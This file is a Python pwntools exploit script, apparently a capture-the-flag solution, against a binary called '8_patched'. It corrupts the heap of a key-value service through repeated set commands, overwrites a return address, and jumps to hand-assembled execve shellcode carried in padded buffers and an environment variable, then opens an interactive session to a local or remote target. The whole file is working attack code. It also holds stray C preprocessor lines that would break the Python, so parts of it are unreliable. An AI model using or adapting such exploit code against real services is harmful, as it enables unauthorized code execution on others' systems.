#!/usr/bin/env python3

from pwn import *

exe = ELF("./8_patched")

context.binary = exe
shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
print(shellcode)
shellcode = asm(shellcode)
#define ENTRY_FLAG_LAST 1L /* entry is last in block */
#define ENTRY_FLAG_USED 2L /* entry is allocated */
#define ENTRY_FLAG_MASK (ENTRY_FLAG_LAST | ENTRY_FLAG_USED)
shellcode_prev ="""
    mov rcx, 0x7fffffffe91effff
    shr rcx, 16
    jmp rcx
"""

shellcode_2 = """
/* push b'/usr/local/bin/l33t\x00' */
    push 0x1010101 ^ 0x743333
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x6c2f6e69622f6c61
    push rax
    mov rax, 0x636f6c2f7273752f
    push rax
    mov rdi, rsp
    /* push argument array ['/usr/local/bin/l33t\x00'] */
    /* push b'/usr/local/bin/l33t\x00' */
    push 0x1010101 ^ 0x743333
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x6c2f6e69622f6c61
    push rax
    mov rax, 0x636f6c2f7273752f
    push rax
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* '/usr/local/bin/l33t\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
"""
#                        b*0x401d04
shellcode_2 = asm(shellcode_2)
shellcode_prev = asm(shellcode_prev)
def conn():
    env = { "SHELLCODE": b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40 }
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def set(r, key, data):
    r.sendline(b"s " + key + b"=" + data)

def get(r, key):
    r.sendline(b"g " + key)

def main():
    r = conn()
    with open("shellcode_full", "wb") as f:
        f.write(b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40)
    print('export SHELLCODE="$(cat shellcode_full)"')
    first_addr = 0x405110
    second_addr = 0x405120
    gots = 0x405070
    ret_addr = 0x7fffffffe8dc
    set(r, b"1", b"A"*200)
    set(r, b"2", b"B"*200)
    set(r, b"1", b"C"*400)
    set(r, b"3", b"D"*46)
    set(r, b"4", b"E"*46)
    set(r, b"4", b"F"*200) 
    set(r, b"3", b"G"*62  + p64(ret_addr) + p64(0x405068)) # Actual overwriting happens here
    
    # Second overwrite
    #set(r, b"5", b"H"*50)
    set(r, b"6", b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40)
    r.sendline(b"x")
    r.interactive()


if __name__ == "__main__":
    main()
